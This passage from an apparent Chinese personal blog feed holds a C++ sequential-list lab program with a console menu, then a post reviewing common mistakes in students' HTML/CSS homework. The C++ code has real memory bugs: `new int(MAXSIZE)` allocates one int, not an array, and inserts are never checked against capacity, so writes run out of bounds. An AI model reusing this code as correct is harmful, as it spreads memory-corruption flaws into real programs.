class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  //定义结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> *elem;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line">SqList L; <span class="comment">//声明变量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span></span>; <span class="comment">//顺序表的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListLength</span><span class="params">(SqList &amp;L)</span></span>;  <span class="comment">//顺序表的长度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EmptyList</span><span class="params">(SqList &amp;L)</span></span>; <span class="comment">//判断顺序表是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(SqList &amp;L)</span></span>; <span class="comment">//清空顺序表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PointList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span>;   <span class="comment">//获取指定位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeforList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span>;   <span class="comment">//求前驱</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AfterList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span>;   <span class="comment">//求后继</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span>;<span class="comment">//顺序表的插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span>; <span class="comment">//删除指定位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Display</span><span class="params">(SqList &amp;L)</span></span>;  <span class="comment">//显示顺序表的结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Postion</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span>;   <span class="comment">//定位</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Menu();</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="keyword">int</span> h,k;    <span class="comment">//获取输入的指定位置和插入数据的元素</span></span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            ClearList(L);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            EmptyList(L);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            ListLength(L);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            PointList(L,h);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            BeforList(L,h);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            AfterList(L,h);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">            InsertList(L,h,k);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            DeleteList(L,h);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            Display(L);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">            Postion(L,k);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(SqList &amp;L)</span><span class="comment">//初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L.elem = <span class="keyword">new</span> <span class="keyword">int</span>(MAXSIZE);</span><br><span class="line">    <span class="keyword">if</span>(!L.elem)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"初始化有误"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListLength</span><span class="params">(SqList &amp;L)</span><span class="comment">//顺序表的长度</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表的长度为"</span>&lt;&lt;L.length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EmptyList</span><span class="params">(SqList &amp;L)</span><span class="comment">//判断顺序表是否为空</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L.length==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表为空"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表非空，长度为"</span>&lt;&lt;L.length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(SqList &amp;L)</span><span class="comment">//清空顺序表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L.length=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表已清空"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PointList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的数字非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"第"</span>&lt;&lt;i&lt;&lt;<span class="string">"个元素为"</span>&lt;&lt;L.elem[i<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BeforList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span><span class="comment">//求前驱</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入数字非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"第一个元素不存在前驱"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"第"</span>&lt;&lt;i&lt;&lt;<span class="string">"个元素的前驱为"</span>&lt;&lt;L.elem[i<span class="number">-2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AfterList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span><span class="comment">//求后继</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入数字非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"最后一个元素不存在后继"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"第"</span>&lt;&lt;i&lt;&lt;<span class="string">"个元素的后继为"</span>&lt;&lt;L.elem[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span><span class="comment">//插入顺序表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;L.length+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=L.length<span class="number">-1</span>;j&gt;=i<span class="number">-1</span>;j--)</span><br><span class="line">            L.elem[j+<span class="number">1</span>]=L.elem[j];  <span class="comment">//从第i+1个元素开始都往后移一位</span></span><br><span class="line">        L.elem[i<span class="number">-1</span>]=x;  <span class="comment">//第i个元素设为x</span></span><br><span class="line">        ++L.length;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"插入元素成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteList</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span><span class="comment">//删除指定元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=<span class="number">0</span>||i&gt;L.length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            L.elem[j<span class="number">-1</span>]=L.elem[j];  <span class="comment">//从第i+1个元素起依次往前移一个位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        --L.length;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"成功删除元素"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Display</span><span class="params">(SqList &amp;L)</span><span class="comment">//显示顺序表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L.length==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前顺序表为空表"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"顺序表为："</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;L.length<span class="number">-1</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;L.elem[j]&lt;&lt;<span class="string">","</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;L.elem[L.length<span class="number">-1</span>];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Postion</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a = <span class="literal">false</span>;<span class="comment">//判断是否能找到</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;L.length;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==L.elem[j])</span><br><span class="line">        &#123;</span><br><span class="line">             a=<span class="literal">true</span>;</span><br><span class="line">             <span class="built_in">cout</span>&lt;&lt;<span class="string">"元素所在位置为："</span>&lt;&lt;j+<span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!a)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"不存在"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----清空线性表"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----判断线性表是否为空"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----求线性表长度"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----获取线性表指定位置元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----求前驱"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----求后继"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----在线性表指定位置插入元素 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"8-----删除空线性表指定位置元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"9-----显示线性表"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"10----定位"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_41998273/article/details/88695510" target="_blank" rel="noopener">实验一 顺序表的操作（数据结构实验）</a></p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;实验性质：设计性实验&quot;&gt;&lt;a href=&quot;#实验性质：设计性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：设计性实验&quot;&gt;&lt;/a&gt;实验性质：设计性实验&lt;/h2&gt;&lt;h2 id=&quot;要求&quot;&gt;&lt;a href=&quot;#要求&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>第一次考核常见问题及知识点总结</title>
    <link href="http://yoursite.com/2020/03/16/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/03/16/%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%8F%8A%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2020-03-16T06:45:00.000Z</published>
    <updated>2020-04-07T09:09:20.681Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>第一次考核已经结束，我们也看了大家的作业，总体来说基本大模样都能写出来，但都存在着这样那样的小问题，大家刚接触这也很正常，下面汇集了大家常见的问题，希望能对大家有所帮助，大家努力努力这几天修改下自己的代码。</p></blockquote><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h3 id="1-图片写成绝对路径，导致发来的作业我们打开看不到你的图片"><a href="#1-图片写成绝对路径，导致发来的作业我们打开看不到你的图片" class="headerlink" title="1. 图片写成绝对路径，导致发来的作业我们打开看不到你的图片"></a>1. 图片写成绝对路径，导致发来的作业我们打开看不到你的图片</h3><p> 例如路径写成<code>&lt;img src= &quot;C:/Users/test/Documents/images/logo.png&quot;&gt;</code>而发来后我们打开网页，网页会去找我们的C盘下的这个文件，而我们C盘又没有这个文件导致图片不能显示。<br><strong>解决方法</strong>：以后图片路径一律写成相对路径，如<code>../images/logo.png</code>这样也方便移动文件后也能正常打开。</p><h3 id="2-代码太乱"><a href="#2-代码太乱" class="headerlink" title="2.代码太乱"></a>2.代码太乱</h3><p>部分同学代码是这个样子，这样代码如果很多的时候很影响阅读<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316195901829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><strong>解决方法</strong>：同一级的要竖直方向对齐，父级和子级之间要差点距离，例如这种<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316200042191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h3 id="3-文件夹层次较乱"><a href="#3-文件夹层次较乱" class="headerlink" title="3.文件夹层次较乱"></a>3.文件夹层次较乱</h3><p>部分同学所有文件在同一文件夹下，这样就会显着很没有层次，以后文件会很多就会显得杂乱无章<br><strong>解决方法</strong>：图片统一在images(也可以取其他名字，但要能一看就知道是放图片的)文件夹下类似的文件统一在一个文件夹下这种，下面提供一种方案。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316200541591.png"  alt="在这里插入图片描述"></p><h3 id="4-缩放后跑到一个方向而不是居中"><a href="#4-缩放后跑到一个方向而不是居中" class="headerlink" title="4. 缩放后跑到一个方向而不是居中"></a>4. 缩放后跑到一个方向而不是居中</h3><p> 如何快速缩放：按住Ctrl键滚动鼠标放大缩小<br> 例如下面这种<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316200859930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><strong>解决方法</strong>：<code>margin:auto；</code>让其自动居中，具体实现另行讲解。</p><h3 id="5-字体颜色距离与原图差异较大"><a href="#5-字体颜色距离与原图差异较大" class="headerlink" title="5. 字体颜色距离与原图差异较大"></a>5. 字体颜色距离与原图差异较大</h3><p> 如果字体距离与原图不同但界面美观也行，但部分同学因字体颜色距离等因素导致界面看起来不美观。目前大家处于模仿阶段，务必做到<strong>与原图一模一样</strong>，不要觉得差不多就退而求其次。<strong>这是非常严重的问题</strong>。<br> <strong>解决方法</strong>：仔细对比原图，我个人用qq自带截图Ctrl+Alt+A，找到需要的颜色的rgb值，然后使用例如color:rgb(123,123,123)这种</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316202857276.png"  alt="在这里插入图片描述"><br>双击数值然后按住键盘上的上下可即时调节(在网页上便可看到效果)</p><h3 id="6-class和id命名问题"><a href="#6-class和id命名问题" class="headerlink" title="6.class和id命名问题"></a>6.class和id命名问题</h3><p>部分同学可能会把每个class命名为如div1、div2、div3这种，但是这种别人在读代码的时候不能直接看出这个class是写的什么东西，看着比较乱。<br><strong>解决方法</strong>：每个命名都有特殊意义，比如用其英文名称搜索框（searchInput）等等，具体命名规范参考：<a href="https://www.zhihu.com/question/38773260" target="_blank" rel="noopener">HTML DIV+CSS 命名规范大全</a></p><h3 id="7-出现横向滚动条了怎么办"><a href="#7-出现横向滚动条了怎么办" class="headerlink" title="7. 出现横向滚动条了怎么办"></a>7. 出现横向滚动条了怎么办</h3><p>看了下很多人出现了这个问题，原因大多是比如你用了一个<code>margin-left:500px</code>让它到达指定的位置，如果你用的台式机显示正常，你看着挺好，但是比如我电脑14寸的，宽度总共就1000多，你来个500不出问题才怪。<br> <strong>按住F12选中某个盒子是经常用到的排查错误的方式</strong><br><strong>解决方法</strong>： 按F12然后点击左边的小鼠标放到右面空白的地方看看是哪个div太宽了导致出现滚动条</p><p><strong>根本解决方法是margin:auto配合左右浮动+外层用百分比</strong> <img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200316220955842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h3 id="8-css代码放到html文件里"><a href="#8-css代码放到html文件里" class="headerlink" title="8.css代码放到html文件里"></a>8.css代码放到html文件里</h3><p>并不是说css和html放一起就是错的，而是如果css代码较多就会显得文章比较乱（假想你要向下一直滑才能看到你的html代码是什么感觉）放一个文件里只适合css代码较少这样比较好维护<br><strong>解决方法</strong>：采用引用外部文件的形式</p><h3 id="9-好多同学都是用table写的"><a href="#9-好多同学都是用table写的" class="headerlink" title="9.好多同学都是用table写的"></a>9.好多同学都是用table写的</h3><p>并不是说用table写是错的，而是table一方面不容易维护，一些框架也都是用div加其他的完成的，日后除后端表格外一般不会用到table<br><strong>解决方法</strong>：<strong>强烈建议大家用div重新写下</strong></p><h3 id="10-乱码问题"><a href="#10-乱码问题" class="headerlink" title="10.乱码问题"></a>10.乱码问题</h3><p>部分同学网页出现乱码<br><strong>解决方法</strong>：其实一行代码就可解决：<code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>，大家可看下源码的&lt;head&gt;中代码格式</p><h3 id="11-咨询建议是固定在窗口固定位置的"><a href="#11-咨询建议是固定在窗口固定位置的" class="headerlink" title="11.咨询建议是固定在窗口固定位置的"></a>11.咨询建议是固定在窗口固定位置的</h3><p>部分同学的咨询建议那不会随着页面滚动而改变位置，可能没理解发布作业时的意思<br><strong>解决方法</strong>：参考下源码中的效果，主要就是<code>position: fixed;</code></p><h3 id="12-部分同学写死宽度"><a href="#12-部分同学写死宽度" class="headerlink" title="12.部分同学写死宽度"></a>12.部分同学写死宽度</h3><p>这里指的是比如你写一个盒子宽1500px,你的电脑比较宽看着没问题，但是放到小点的电脑1500px太宽了就会出现滚动条</p><p><strong>解决方法</strong>：对于较大的宽度用百分比表示(一般在&lt;head&gt;、&lt;footer&gt;这种外层框架才会用到)</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="1-margin-0-auto；配合左右浮动"><a href="#1-margin-0-auto；配合左右浮动" class="headerlink" title="1. margin:0 auto；配合左右浮动"></a>1. margin:0 auto；配合左右浮动</h3><p>红色框的宽度固定假如为1000px;再加个margin: 0 auto; 让红色框水平方向居中；<br>再加个overflow: hidden;清除文档流的浮动，避免红色框以外的元素随着里面元素的浮动<br>里面的两个黑色框宽度固定但不要超过父元素宽度，一个float:left, 一个float:right;<br><strong>如果黑色框里还有这种左右结构，可以继续将其进行拆分</strong><br>按照这个方式 布局就能让网页在不同大小的屏幕（电脑屏幕）或不同浏览器上浏览排版不乱<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020031620583817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h3 id="2-浮动float"><a href="#2-浮动float" class="headerlink" title="2.浮动float"></a>2.浮动float</h3><p>浮动在初学时可能好多锅都是因为没用好浮动，比如怎么盒子高度为0。<br>具体参考CSS浮动：</p><p><a href="https://www.w3school.com.cn/css/css_positioning_floating.asp" target="_blank" rel="noopener">W3school的css浮动</a><br><a href="http://note.youdao.com/noteshare?id=23baf392c0507c36b50caf307b0d7b4b" target="_blank" rel="noopener">个人写的关于盒子高度为0的例子</a></p><h3 id="3-改了代码却不生效"><a href="#3-改了代码却不生效" class="headerlink" title="3.改了代码却不生效"></a>3.改了代码却不生效</h3><p>这种问题可能是代码没写好，但有时代码没什么问题，却还是不生效。这是因为浏览器的缓存机制的问题。浏览器为了节省流量和更快的打开网页，在用户多次刷新时并不会重新刷新所有文件，而只是刷新部分文件，这就导致可能你改动的代码并未被浏览器重新引用。<br><strong>解决方法</strong>：清除浏览器数据</p><p>谷歌浏览器是这样，其他浏览器类似<img 